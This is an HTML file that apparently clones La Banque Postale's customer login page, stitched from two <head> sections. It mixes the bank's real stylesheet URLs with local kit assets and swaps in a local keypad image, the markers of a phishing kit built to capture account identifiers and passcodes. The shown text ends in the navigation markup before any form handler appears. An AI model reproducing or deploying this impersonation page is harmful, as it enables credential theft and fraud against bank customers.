<html lang="fr">

<head data-template="loginpage">
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <meta name="robots" content="index, follow">

    <style data-tippy-stylesheet="">
        .tippy-box[data-animation=fade][data-state=hidden]{opacity:0}[data-tippy-root]{max-width:calc(100vw - 10px)}.tippy-box{position:relative;background-color:#333;color:#fff;border-radius:4px;font-size:14px;line-height:1.4;outline:0;transition-property:transform,visibility,opacity}.tippy-box[data-placement^=top]>.tippy-arrow{bottom:0}.tippy-box[data-placement^=top]>.tippy-arrow:before{bottom:-7px;left:0;border-width:8px 8px 0;border-top-color:initial;transform-origin:center top}.tippy-box[data-placement^=bottom]>.tippy-arrow{top:0}.tippy-box[data-placement^=bottom]>.tippy-arrow:before{top:-7px;left:0;border-width:0 8px 8px;border-bottom-color:initial;transform-origin:center bottom}.tippy-box[data-placement^=left]>.tippy-arrow{right:0}.tippy-box[data-placement^=left]>.tippy-arrow:before{border-width:8px 0 8px 8px;border-left-color:initial;right:-7px;transform-origin:center left}.tippy-box[data-placement^=right]>.tippy-arrow{left:0}.tippy-box[data-placement^=right]>.tippy-arrow:before{left:-7px;border-width:8px 8px 8px 0;border-right-color:initial;transform-origin:center right}.tippy-box[data-inertia][data-state=visible]{transition-timing-function:cubic-bezier(.54,1.5,.38,1.11)}.tippy-arrow{width:16px;height:16px;color:#333}.tippy-arrow:before{content:"";position:absolute;border-color:transparent;border-style:solid}.tippy-content{position:relative;padding:5px 9px;z-index:1}
    </style>
    <link rel="canonical" href="https://www.labanquepostale.fr/particulier/connexion-espace-client.html">

    <meta property="og:type" content="website">
    <meta property="og:url" content="https://www.labanquepostale.fr/particulier/connexion-espace-client.html">
    <meta property="og:title" content="connexion PPH">
    <meta property="og:description" content="Connectez-vous à l'espace sécurisé de La Banque Postale pour la clientèle des particuliers.">

    <meta name="twitter:card" content="summary_large_image">
    <link rel="stylesheet" type="text/css" href="assets/fonts/icofont.min.css">
    <link rel="stylesheet" type="text/css" href="assets/css/anim.css">
    <link rel="stylesheet" type="text/css" href="../assets/css/anim.css">
    <link rel="stylesheet" href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base-fonts.min.b348284fe75e909098f43929a79e732e.css" type="text/css">
    <link rel="preload" href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base-fonts.min.b348284fe75e909098f43929a79e732e.css" as="style" type="text/css">

    <link rel="stylesheet" href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/sitepublic/clientlibs/base.min.585a7e8db5e6909b88b88c1028b2d95a.css" type="text/css">

    <meta name="env" content="production">

    <!-- TAG COMMANDER START //-->
    <script type="text/javascript">
        var url = window.location.href;
        var pathname = window.location.pathname;
        var lastIndex = pathname.substring(pathname.lastIndexOf('/') + 1);
        var pagename = lastIndex.slice(0, lastIndex.indexOf("."));

        function getMeta(metaName) {
          var metas = document.getElementsByTagName('meta');
          for (let i = 0; i < metas.length; i++) {
            if (metas[i].getAttribute('property') === metaName || metas[i].getAttribute('name') === metaName) {
              return metas[i].getAttribute('content');
            }
          }
          return '';
        }
        var pageMetaName = getMeta("og:title");
        var env = getMeta("env");

        var tc_vars = {
            cms_template_name: '/apps/labanquepostale/sitepublic/templates/loginpage',
            cms_page_name: window.location.pathname,
            cms_page_title: pagename  !== "" ? pagename : pageMetaName,
            override_page_name: "",
            xiti_xtpage: 'connexion-espace-client',
            xiti_xtsite: '388889',
            environnement: env
        };
    </script>

    <script async="" type="text/javascript" src="//cdn.tagcommander.com/2623/tc_LaBanquePostale_4.js"></script>
    <!-- TAG COMMANDER END //-->

    <!-- default favicon -->
    <link rel="shortcut icon" href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/logo-lbp.png" type="image/x-icon">
    <link rel="icon" href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/logo-lbp.png" sizes="32x32" type="image/png">

    <!-- for android mobile devices -->
    <link rel="icon" href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/logo-lbp.png" type="image/png" sizes="192x192">

    <!-- for apple mobile devices -->
    <link rel="apple-touch-icon" href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/apple-touch-icon.png" type="image/png" sizes="152x152">
    <link rel="apple-touch-icon" href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/apple-touch-icon.png" type="image/png" sizes="120x120">
    <link rel="apple-touch-icon-precomposed" href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/apple-touch-icon.png" type="image/png" sizes="152x152">
    <link rel="apple-touch-icon-precomposed" href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/apple-touch-icon.png" type="image/png" sizes="120x120">
    <!-- google tv favicon -->
    <link rel="icon" href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/logo-lbp.png" sizes="96x96" type="image/png">

    <title>Connexion à l'espace client - La Banque Postale</title>

    <meta name="description" content="Connectez-vous à l'espace sécurisé de La Banque Postale pour la clientèle des particuliers.">
    <script data-dapp-detection="">
        !function(){let e=!1;function n(){if(!e){const n=document.createElement("meta");n.name="dapp-detected",document.head.appendChild(n),e=!0}}if(window.hasOwnProperty("ethereum")){if(window.__disableDappDetectionInsertion=!0,void 0===window.ethereum)return;n()}else{var t=window.ethereum;Object.defineProperty(window,"ethereum",{configurable:!0,enumerable:!1,set:function(e){window.__disableDappDetectionInsertion||n(),t=e},get:function(){if(!window.__disableDappDetectionInsertion){const e=arguments.callee;e&&e.caller&&e.caller.toString&&-1!==e.caller.toString().indexOf("getOwnPropertyNames")||n()}return t}})}}();
    </script>
</head>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <title>Identification - La Banque Postale</title>

    <meta http-equiv="content-style-type" content="text/css">
    <meta name="robots" content="noindex, nofollow">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <style type="text/css">
        @import url(https://transverse.labanquepostale.fr/xo_/09_08_06.000/cvvs/css/cvs_all.css);
                    @import url(https://transverse.labanquepostale.fr/xo_/09_08_06.000/cvvs/css/loader.css);
                    [id="imageclavier"]{
                        background:url(loginform?imgid=allunifie2&e=4&0.06503318213230924) no-repeat 13px 6px;
                    }
    </style>
    <style type="text/css" media="(orientation:portrait) and (max-height:533px)">
        @import url(https://transverse.labanquepostale.fr/xo_/09_08_06.000/cvvs/css/cvs_portable.css);
                    [id="imageclavier"]{
                        background:url(loginform?imgid=allunifie1&e=3&0.3284710082298965) no-repeat 44px 6px;
                    }
    </style>
    <script type="text/javascript">
        if (!navigator.cookieEnabled){
                document.location.href='https://transverse.labanquepostale.fr/xo_/messages/message.html?param=NoCookie&origin=particuliers';
            }
    </script>
    <!--[if lte IE 10]>
            <script type="text/javascript">
                currentPageUrlIs = document.location.toString();
                var originIE = false;
                var origin;
                var urlEnvoyee = "";
                var t = location.search.substring(1).split('&');
                for (var i=0; i<t.length; i++){
                    var x = t[ i ].split('=');
                    if(x[0] === "URL"){
                        urlEnvoyee = x[1];
                    }
                    else{
                        if(x[1] === "professionnels"){
                            origin = "professionnels";
                        }
                        else if(x[1] === "professionnelsIE67"){
                            origin = "professionnelsIE67";
                        }
                        else if(x[1] === "particuliersIE67"){
                            origin = "particuliersIE67";
                        }
                        else if(x[1] === "particuliers"){
                            origin = "particuliers";
                        }
                    }
                }
                if(urlEnvoyee != ""){
                    urlEnvoyee = unescape(urlEnvoyee);
                    t = urlEnvoyee.split('&');
                    for (var j=0; j<t.length; j++){
                        var y = t[ j ].split('=');
                        if(y[1] === "professionnels"){
                            origin = "professionnels";
                        }
                        else if(y[1] === "professionnelsIE67"){
                            origin = "professionnelsIE67";
                        }
                        else if(y[1] === "particuliersIE67"){
                            origin = "particuliersIE67";
                        }
                        else if(y[1] === "particuliers"){
                            origin = "particuliers";
                        }
                    }
                }
                if(origin === "particuliersIE67" || origin === "professionnelsIE67"){
                    originIE = true;
                }
                if(!originIE){
                    if(origin === "professionnels"){
                        newURL = currentPageUrlIs.replace("professionnels","professionnelsIE67");
                        window.location.href = newURL;
                    }
                    else if(origin === "particuliers"){
                        newURL = currentPageUrlIs.replace("particuliers","particuliersIE67");
                        window.location.href = newURL;
                    }
                }
            </script>
        <![endif]-->
    <!--[if lt IE 9]>
            <style type="text/css">@import url(https://transverse.labanquepostale.fr/xo_/09_08_06.000/cvvs/css/cvs_oldie.css);</style>
        <![endif]-->
    <script data-dapp-detection="">
        !function(){let e=!1;function n(){if(!e){const n=document.createElement("meta");n.name="dapp-detected",document.head.appendChild(n),e=!0}}if(window.hasOwnProperty("ethereum")){if(window.__disableDappDetectionInsertion=!0,void 0===window.ethereum)return;n()}else{var t=window.ethereum;Object.defineProperty(window,"ethereum",{configurable:!0,enumerable:!1,set:function(e){window.__disableDappDetectionInsertion||n(),t=e},get:function(){if(!window.__disableDappDetectionInsertion){const e=arguments.callee;e&&e.caller&&e.caller.toString&&-1!==e.caller.toString().indexOf("getOwnPropertyNames")||n()}return t}})}}();
    </script>

    <style>
        .o-footer section{
            height: inherit !important;
        }
    </style>


<style>

[id="imageclavier"] {
    background: url("assets/images/grid.gif") no-repeat 44px 6px !important;
}
#val_cel_identifiant{
    font-size : 20px !important;
}
    </style>


<style>
    @media (min-width: 768px){
        .o-cvslogin__container>div {
        max-width: inherit;
    }
    }

</style>
</head>
<body tabindex="-1" aria-hidden="true">
    <div class="js-avoidlinks">
        <ul class="m-list--horizontal--align-left">
            <li><a class="a-avoidlink__item u-btn m-button--content m-button--tertiary u-spacing-s" href="https://voscomptesenligne.labanquepostale.fr/voscomptes/canalXHTML/identif.ea?origin=particuliers"><span>Accès à vos comptes par l'écran de connexion pleine page</span></a></li>
            <li><a class="a-avoidlink__item u-btn m-button--content m-button--tertiary u-spacing-s" href="#avoid-menu"><span>Accéder au Menu Principal</span></a></li>
            <li><a class="a-avoidlink__item u-btn m-button--content m-button--tertiary u-spacing-s" href="#avoid-contenu"><span>Accéder au Contenu éditorial</span></a></li>
            <li><a class="a-avoidlink__item u-btn m-button--content m-button--tertiary u-spacing-s" href="#avoid-footer"><span>Accéder au Pied de page</span></a></li>
        </ul>
    </div>

    <header id="header" class="o-header  " role="banner">

        <div class="m-logo u-spacing-s-xs">

            <a href="/" class="js-logo-type" title="La Banque Postale">

                <img src="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/logo-lbp.png" width="50" height="50" alt="">
            </a>

        </div>

        <div class="o-header__wrapper">

            <div class="o-metanavigation u-flex u-flex--column u-flex--horizontal u-spacing-md-left u-spacing-2xs-xs-left" aria-expanded="false">

                <button class="o-metanavigation__trigger" data-sticky-hidden="" title="Changer de site Particuliers - Afficher la liste des sites La Banque Postale">
        <span class="a-text--tiny">Changer de site </span>
        <span class="a-text--small lato-bold u-text-color--black">
            Particuliers 
            <svg xmlns="http://www.w3.org/2000/svg"  height="25px" viewBox="0 0 24 24" id="ic-interface-chevron-down">
            <path fill-rule="evenodd" d="M12 15.565c-.384 0-.768-.146-1.061-.438l-4.533-4.533a.5.5 0 01.707-.707l4.533 4.532a.5.5 0 00.708 0l4.533-4.532a.5.5 0 01.707.707l-4.533 4.533a1.498 1.498 0 01-1.061.438"></path>
        </svg>
        </span>
    </button>
    <style>
*{padding:0;margin:0;font-family:Verdana,Geneva,sans-serif;}
body{font-size:75%;}
[id="imageclavier"]{padding:6px 0 0 13px;}
*:focus{outline:0;}
input[type=submit],input[type=button]{-webkit-appearance:none;-webkit-border-radius:0;-moz-appearance:none;-moz-border-radius:0;border-radius:0;}
[id="cvs-bloc"]{background:#FFF;width:278px;margin:5px auto 5px auto;padding-top:10px;border:1px solid #FFF;font-family:arial,Helvetica,sans-serif;}
[id="cvs-bloc-identifiant"]{margin-bottom:5px;}
[id="cvs-bloc"] .cvs-label-num{display:inline-block;color:#004B9B;font-size:1.5rem;font-weight:bold;margin:0 0 5px 15px;}
[id="cvs-bloc-identifiant"] label{font-size:.9rem;color:#676767;}
[id="blocBlocageWindowsPhone"]{text-align:center;}
.webaccess{position:absolute;clip:rect(1px 1px 1px 1px);clip:rect(1px,1px,1px,1px);padding:0;border:0;height:1px;width:240px;overflow:hidden;}
[id="cvs-bloc-date-naissance"] label.webaccess{width:1px;}
[id="cvs-bloc-identifiant"] label.webaccessvisible{display:block;text-align:left;margin-left:12.906px;font-size:.9rem;}
[id="cvs-bloc-mdp"] label.webaccessvisible{display:block;text-align:left;margin-left:12.906px;font-size:.9rem;color:#676767;}
[id="cvs-bloc-identifiant"] label.labelVisible,[id="cvs-bloc-mdp"] label.labelVisible{font-size:.9rem;color:#676767;display:block;text-align:left;padding-left:15px;}
[id="cvs-bloc-identifiant"] input[type=tel],[id="cvs-bloc-identifiant"] input[type=text]{display:block;height:35px;width:90%;margin:0 auto 5px auto;border:1px solid #dcdcdc;font-size:1.7rem;text-align:center;letter-spacing:2px;color:#526272;}
[id="cvs-bloc-identifiant"] input[type=text]{font-size:.9rem;letter-spacing:0;color:#A0A0A0;}
[id="cvs-bloc-mdp"] input[id="cvs-bloc-mdp-input"],[id="cvs-bloc-mdp"] input[id="cvs-bloc-mdp-input-hidden"]{display:block;background:#fff;height:35px;width:90%;margin:0 auto 5px auto;border:1px solid #dcdcdc;font-size:1.2rem;color:#526272;letter-spacing:8px;text-align:center;}
[id="cvs-bloc-mdp"] input[id="cvs-bloc-mdp-input-hidden"]{font-size:.9rem;letter-spacing:0;color:#A0A0A0;}
[id="cvs-bloc-identifiant"] input[type=tel]:focus{border:2px solid #eec77c;height:33px;}
[id="cvs-bloc-identifiant"] input[type=tel]:-ms-input-placeholder,[id="cvs-bloc-mdp"] input[id="cvs-bloc-mdp-input"]:-ms-input-placeholder{color:#526272;font-style:italic;letter-spacing:0;font-size:.9rem;font-weight:normal;text-align:center;}
input::-webkit-input-placeholder{color:#526272;font-style:italic;letter-spacing:0;font-size:.9rem;font-weight:normal;padding-top:5px;text-align:center;}
[id="cvs-bloc-identifiant"] input[type=tel]::-moz-placeholder,[id="cvs-bloc-mdp"] input[id="cvs-bloc-mdp-input"]::-moz-placeholder{color:#00060C;font-size:.91rem;font-style:italic;letter-spacing:0;text-align:center;}
[id="cvs-bloc-identifiant"] input[type=tel]:-moz-placeholder,[id="cvs-bloc-mdp"] input[id="cvs-bloc-mdp-input"]:-moz-placeholder{color:#00060C;font-size:.91rem;font-style:italic;letter-spacing:0;text-align:center;}
#cvs-bloc-identifiant #val_cel_identifiant_masque{display:none;}
.input-non-modif{color:#c0c0c0;}
[id="cvs-bloc-identifiant"] input[type=checkbox]+div{display:inline-block;margin-left:5px;}
[id="cvs-bloc-identifiant"] input[type=checkbox]{margin-left:15px;}
[id="cvs-bloc-identifiant"] input[type=checkbox]:focus{outline:1px solid #eec77c;}
a,a:visited{color:#004b9b;}
a:hover{color:#425569;}
.cache,[id="cvs-bloc-identifiant"] input[type=tel].cache,[id="cvs-bloc-identifiant"] input[type=text].cache,[id="cvs-bloc-mdp"] input[id="cvs-bloc-mdp-input"].cache,[id="cvs-bloc-mdp"] input[id="cvs-bloc-mdp-input-hidden"].cache{display:none;}
.non-cache{display:block;}
[id="cvs-lien-voca"]{padding:0 13px;}
[id="cvs-lien-voca"] input{background:#586879;border:1px solid #445261;width:100%;padding:5px 0;color:#fff;font-weight:bold;}
[id="professionnels"] [id="cvs-lien-voca"] input{background:#E6E6E6;border:1px solid #666;color:#222;font-weight:normal;}
[id="blocImage"]{position:relative;}
[id="blocImage"]>img{display:block;margin:6px auto;padding:0;position:relative;}
[id="imageclavier"] div{height:60px;width:256px;margin-bottom:4px;}
[id="imageclavier"] div button{background-color:transparent;width:60px;height:60px;border:none;position:relative;margin-right:4px;cursor:pointer;border:3px solid transparent;}
[id="imageclavier"] div button img{width:60px;height:60px;}
[id="imageclavier"] div button:hover,[id="imageclavier"] div button:focus{border:3px solid #eec77c;}
[id="imageclavier"] div button:active{background-color:#eec77c;border-top:3px solid transparent;}
[id="cvs-bloc-boutons"]{width:100%;text-align:center;margin-bottom:5px;}
[id="cvs-bloc-boutons"] input{background:#586879;border:1px solid #445261;width:43%;height:40px;font-weight:bold;color:#fff;text-transform:uppercase;}
[id="cvs-bloc-boutons"] input#valider{background:#004B9B;border:1px solid #00346d;}
[id="cvs-bloc-boutons"] input[type=button]:focus{border:2px solid #eec77c;}
[id="professionnels"] [id="cvs-bloc-boutons"] input#valider{background:#326680;border:1px solid #326680;}
[id="professionnels"] [id="cvs-bloc-boutons"] input#effacer{background:#E6E6E6;border:1px solid #666;color:#222;font-weight:normal;}
[id="cvs-bloc-boutons"] input#valider.grey{opacity:.7;}
[id="cvs-bloc-boutons"] input:first-child{margin-right:7px;}
[id="cvs-bloc-boutons"] input:active,[id="cvs-bloc-boutons"] input:focus,[id="cvs-bloc-boutons"] input#effacer:active,[id="cvs-bloc-boutons"] input#effacer:focus,[id="cvs-bloc-boutons"] input#valider:active,[id="cvs-bloc-boutons"] input#valider:focus,[id="cvs-bloc-boutons"] input#valider:hover,[id="cvs-bloc-boutons"] input#valider:hover{border:3px solid #eec77c;}
[id="cvs-lien-voca"] input#cvs-lien-voca-active:active,[id="cvs-lien-voca"] input#cvs-lien-voca-active:focus,[id="cvs-lien-voca"] input#cvs-lien-voca-desactive:active,[id="cvs-lien-voca"] input#cvs-lien-voca-desactive:focus{border:1px solid #eec77c;}
[id="cvs-bloc-boutons"] input#valider:disabled{border:none;}
*+html [id="cvs-bloc-boutons"] input:focus{border:3px solid #eec77c\0/IE9;}
[id="cvs-bloc-boutons"] input:focus{border:3px solid #eec77c\9;}
div.bloc{display:block;margin:5px auto;width:278px;height:55px;background:#f8f8f8;border:1px solid #ccc;padding-top:5px;}
div.blocBas{background:#f8f8f8;padding-bottom:6px;}
.contenu{display:block;width:100%;}
html>body h1.mp{font-size:100%;}
h1.mp{background:transparent url(../img/puce_cadenas_2.png) no-repeat scroll 5px 0;color:#2752A0;font-size:.7rem;font-weight:bold;padding:5px 0 5px 45px;text-transform:uppercase;}
[id="cvs-bloc-date-naissance"]{border-top:1px solid #B8ADA6;border-bottom:1px solid #B8ADA6;margin:10px 13px;padding:10px 0;}
[id="cvs-bloc-date-naissance"] span{display:block;text-align:left;margin-bottom:10px;font-size:.8rem;}
[id="cvs-bloc-date-naissance"] select{width:80px;height:30px;font-size:.8rem;padding-left:5px;}
[id="cvs-bloc-mdp"] label.webaccessvisible{display:block;font-size:.8rem;margin:7px 13px;font-size:.8rem;}
[id="logoSuiviBudget"]{margin-top:100px;}
[id="messageSuiviBudget"]{margin-top:50px;color:#17479e;}
[id="lienSuiviBudget"]{margin-top:120px;}
.hauteurFixe446{height:446px;}
.paragrapheMessage{padding:20px 2px 2px 0;font-weight:bold;text-align:center;}
.paragrapheMessage .lien{font-weight:normal;}
.paragrapheMessage a{color:#676767;}
.zone-inactif{content:"";position:absolute;top:0;bottom:0;left:0;right:0;background:transparent;z-index:98;display:none;}
    </style>
                <div class="o-metanavigation__panel" role="dialog" aria-label="Changer de site" aria-modal="true">
                    <div role="document">
                        <div class="o-metanavigation__header u-flex u-flex--vertical">
                            <span class="o-metanavigation__trigger" data-sticky-hidden="">
                    <span class="a-text--tiny">Changer de site </span>
                            <span class="a-text--small lato-bold u-text-color--black">
                        Particuliers  
                        <svg viewBox="0 0 10 10" class="a-icon--s" aria-hidden="true" focusable="false">
                            <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-up"></use>
                        </svg>
                    </span>
                            </span>
                            <button class="o-metanavigation__close">
                    <span class="sr-only">Fermer la liste des sites la Banque Postale</span>
                    <svg class="a-icon--s u-svg-color--grey_color_5" aria-hidden="true" focusable="false">
                        <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-close"></use>
                    </svg>
                </button>
                        </div>
                        <ul class="o-metanavigation__boxlist u-flex--wrap">

                            <li class="m-metanavigation__box a-navigation__list__item " title="Particuliers">

                                <span class="m-title--h5 hidden-xs hidden-sm lato-bold u-align-center u-spacing-xs-bottom u-spacing-none-xs-bottom u-spacing-none-sm-bottom u-spacing-s-sm-left u-spacing-s-xs-left">
                            Particuliers
                        </span>
                                <button class="js-metanavigation__box__btn m-title--h5 hidden-md hidden-lg lato-bold u-align-center u-spacing-xs-bottom u-spacing-none-xs-bottom u-spacing-none-sm-bottom u-spacing-s-sm-left u-spacing-s-xs-left">
                            Particuliers
                        </button>
                                <svg class="a-navigation__list__item__icon a-icon--s hidden-md hidden-lg" aria-hidden="true" focusable="false">
                            <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
                        </svg>
                                <div class="m-header__panel--mobile u-align-center">
                                    <div class="m-header__panel__title hidden-md hidden-lg ">
                                        <div class="m-metanavigation__box__title">

                                            <button role="button" class="m-header__panel__back submenu hidden-md hidden-lg" title="Retour au premier niveau de la liste des sites">
                                        <svg class="a-icon--s" aria-hidden="true" focusable="false">
                                            <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-left"></use>
                                        </svg>
                                        <span class="sr-only">Retour au premier niveau de la liste des sites</span>
                                    </button>
                                            <span class=" m-title--h5 u-text-color--black u-spacing-s-left ">Particuliers</span>
                                        </div>
                                    </div>
                                    <ul class="m-metanavigation__box__list">

                                        <li class="a-text--small a-navigation__submenu__item u-spacing-2xs-bottom u-spacing-none-xs-bottom">
                                            <a href="/" class="m-metanavigation__box__link ">Accueil site Particuliers</a>
                                            <svg class="a-icon--xs hidden-xs hidden-sm" aria-hidden="true" focusable="false">
                                        <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
                                    </svg>
                                        </li>

                                        <li class="a-text--small a-navigation__submenu__item u-spacing-2xs-bottom u-spacing-none-xs-bottom">
                                            <a href="/particulier/solutions-jeunes.html" class="m-metanavigation__box__link ">Solutions Jeunes</a>
                                            <svg class="a-icon--xs hidden-xs hidden-sm" aria-hidden="true" focusable="false">
                                        <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
                                    </svg>
                                        </li>

                                        <li class="a-text--small a-navigation__submenu__item u-spacing-2xs-bottom u-spacing-none-xs-bottom">
                                            <a href="/particulier/solutions-famille.html" class="m-metanavigation__box__link ">Solutions Familles</a>
                                            <svg class="a-icon--xs hidden-xs hidden-sm" aria-hidden="true" focusable="false">
                                        <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
                                    </svg>
                                        </li>

                                        <li class="a-text--small a-navigation__submenu__item u-spacing-2xs-bottom u-spacing-none-xs-bottom">
                                            <a href="/particulier/solutions-retraites.html" class="m-metanavigation__box__link ">Solutions Retraités</a>
                                            <svg class="a-icon--xs hidden-xs hidden-sm" aria-hidden="true" focusable="false">
                                        <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
                                    </svg>
                                        </li>

                                        <li class="a-text--small a-navigation__submenu__item u-spacing-2xs-bottom u-spacing-none-xs-bottom">
                                            <a href="/particulier/solutions-patrimoniales.html" class="m-metanavigation__box__link ">Solutions Patrimoniales</a>
                                            <svg class="a-icon--xs hidden-xs hidden-sm" aria-hidden="true" focusable="false">
                                        <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
                                    </svg>
                                        </li>
                                    </ul>
                                </div>

                            </li>

                            <li class="m-metanavigation__box a-navigation__list__item " title="Professionnels">

                                <span class="m-title--h5 hidden-xs hidden-sm lato-bold u-align-center u-spacing-xs-bottom u-spacing-none-xs-bottom u-spacing-none-sm-bottom u-spacing-s-sm-left u-spacing-s-xs-left">
                            Professionnels
                        </span>
                                <button class="js-metanavigation__box__btn m-title--h5 hidden-md hidden-lg lato-bold u-align-center u-spacing-xs-bottom u-spacing-none-xs-bottom u-spacing-none-sm-bottom u-spacing-s-sm-left u-spacing-s-xs-left">
                            Professionnels
                        </button>
                                <svg class="a-navigation__list__item__icon a-icon--s hidden-md hidden-lg" aria-hidden="true" focusable="false">
                            <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
                        </svg>
                                <div class="m-header__panel--mobile u-align-center">
                                    <div class="m-header__panel__title hidden-md hidden-lg ">
                                        <div class="m-metanavigation__box__title">

                                            <button role="button" class="m-header__panel__back submenu hidden-md hidden-lg" title="Retour au premier niveau de la liste des sites">
                                        <svg class="a-icon--s" aria-hidden="true" focusable="false">
                                            <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-left"></use>
                                        </svg>
                                        <span class="sr-only">Retour au premier niveau de la liste des sites</span>
                                    </button>
                                            <span class=" m-title--h5 u-text-color--black u-spacing-s-left ">Professionnels</span>
                                        </div>
                                    </div>
                                    <ul class="m-metanavigation__box__list">

                                        <li class="a-text--small a-navigation__submenu__item u-spacing-2xs-bottom u-spacing-none-xs-bottom">
                                            <a href="/professionnels.html" class="m-metanavigation__box__link ">Accueil site Professionnels</a>
                                            <svg class="a-icon--xs hidden-xs hidden-sm" aria-hidden="true" focusable="false">
                                        <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
                                    </svg>
                                        </li>
                                    </ul>
                                </div>

                            </li>

                            <li class="m-metanavigation__box a-navigation__list__item " title="Entreprises">

                                <span class="m-title--h5 hidden-xs hidden-sm lato-bold u-align-center u-spacing-xs-bottom u-spacing-none-xs-bottom u-spacing-none-sm-bottom u-spacing-s-sm-left u-spacing-s-xs-left">
                            Entreprises
                        </span>
                                <button class="js-metanavigation__box__btn m-title--h5 hidden-md hidden-lg lato-bold u-align-center u-spacing-xs-bottom u-spacing-none-xs-bottom u-spacing-none-sm-bottom u-spacing-s-sm-left u-spacing-s-xs-left">
                            Entreprises
                        </button>
                                <svg class="a-navigation__list__item__icon a-icon--s hidden-md hidden-lg" aria-hidden="true" focusable="false">
                            <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
                        </svg>
                                <div class="m-header__panel--mobile u-align-center">
                                    <div class="m-header__panel__title hidden-md hidden-lg ">
                                        <div class="m-metanavigation__box__title">

                                            <button role="button" class="m-header__panel__back submenu hidden-md hidden-lg" title="Retour au premier niveau de la liste des sites">
                                        <svg class="a-icon--s" aria-hidden="true" focusable="false">
                                            <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-left"></use>
                                        </svg>
                                        <span class="sr-only">Retour au premier niveau de la liste des sites</span>
                                    </button>
                                            <span class=" m-title--h5 u-text-color--black u-spacing-s-left ">Entreprises</span>
                                        </div>
                                    </div>
                                    <ul class="m-metanavigation__box__list">

                                        <li class="a-text--small a-navigation__submenu__item u-spacing-2xs-bottom u-spacing-none-xs-bottom">
                                            <a href="/entreprises.html" class="m-metanavigation__box__link ">Accueil site Entreprises</a>
                                            <svg class="a-icon--xs hidden-xs hidden-sm" aria-hidden="true" focusable="false">
                                        <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
                                    </svg>
                                        </li>
                                    </ul>
                                </div>

                            </li>

                            <li class="m-metanavigation__box a-navigation__list__item " title="Associations">

                                <span class="m-title--h5 hidden-xs hidden-sm lato-bold u-align-center u-spacing-xs-bottom u-spacing-none-xs-bottom u-spacing-none-sm-bottom u-spacing-s-sm-left u-spacing-s-xs-left">
                            Associations
                        </span>
                                <button class="js-metanavigation__box__btn m-title--h5 hidden-md hidden-lg lato-bold u-align-center u-spacing-xs-bottom u-spacing-none-xs-bottom u-spacing-none-sm-bottom u-spacing-s-sm-left u-spacing-s-xs-left">
                            Associations
                        </button>
                                <svg class="a-navigation__list__item__icon a-icon--s hidden-md hidden-lg" aria-hidden="true" focusable="false">
                            <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
                        </svg>
                                <div class="m-header__panel--mobile u-align-center">
                                    <div class="m-header__panel__title hidden-md hidden-lg ">
                                        <div class="m-metanavigation__box__title">

                                            <button role="button" class="m-header__panel__back submenu hidden-md hidden-lg" title="Retour au premier niveau de la liste des sites">
                                        <svg class="a-icon--s" aria-hidden="true" focusable="false">
                                            <use xlink:href="https://www.labanquepostale.fr/etc.clientlibs/labanquepostale/commons/clientlibs/base/resources/svg-icons.svg#ic-interface-chevron-left"></use>
                                        </svg>
                                        <span class="sr-only">Retour au premier niveau de la liste des sites</span>
